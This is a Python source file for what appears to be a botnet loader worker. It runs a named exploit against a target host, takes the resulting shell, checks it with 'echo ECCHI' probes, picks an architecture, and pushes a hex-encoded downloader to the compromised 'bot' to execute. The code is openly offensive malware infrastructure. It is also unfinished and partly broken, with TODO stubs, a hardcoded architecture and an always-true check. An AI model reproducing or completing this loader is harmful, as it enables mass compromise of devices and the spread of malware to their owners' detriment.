import threading

from util_connection import *


class Worker(threading.Thread):
    def __init__(self, target_ip, target_port, attack_type, get_payload_cb):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type
        self.get_payload_cb = get_payload_cb

        self.connect_back_ip = None
        self.connect_back_port = None
        self.username = None
        self.password = None
        self.hex_payloads = []
        self.exploit_func = None
        # TODO: Generate connect back ip, port
        if self.attack_type == "myvmware":
            from exploits.exploit4myvm import exploit_func as ex_func
            self.exploit_func = ex_func

        # TODO: Select attack vector from attack_type
        pass

    def run(self):
        # TODO: Start attack vector, get result include shell (by socket)
        conn = self.exploit_func(self.target_ip, self.target_port)
        print("Create conn done")
        # Deploy dlr

        state = 0
        payload_pos = 0
        ret = -1
        arch = ""
        while True:
            rdbuff = conn.recv(1024)
            if len(rdbuff) != -1:
                pass

            # Setup states machine
            if state == 0 and (':' in rdbuff or '>' in rdbuff or '$' in rdbuff or '#' in rdbuff or '%' in rdbuff):
                # TODO: Check writeable dir
                state += 1
                conn.send("/bin/echo ECCHI\n")
            elif state == 1:
                # TODO: Check writeable dir and check arch
                if connection_consume(rdbuff):
                    arch = "x86"
                    state += 1
                conn.send("/bin/echo ECCHI\n")
            elif state == 2:
                # TODO: Consume arch
                # TODO: Get payload refer arch
                if connection_consume(rdbuff):
                    state += 1
                    self.hex_payloads = self.get_payload_cb(arch)
                conn.send("/bin/echo ECCHI\n")
                pass
            elif state == 3:
                if connection_consume(rdbuff):
                    if ret > 0:
                        state += 1
                    elif ret == 0:
                        payload_pos += 1

                    # Send dlr to bot
                    ret = connection_load_dlr(conn, self.hex_payloads, payload_pos)

            elif state == 4:
                if connection_consume(rdbuff):
                    print("Send dlr done, execute dlr")

        pass
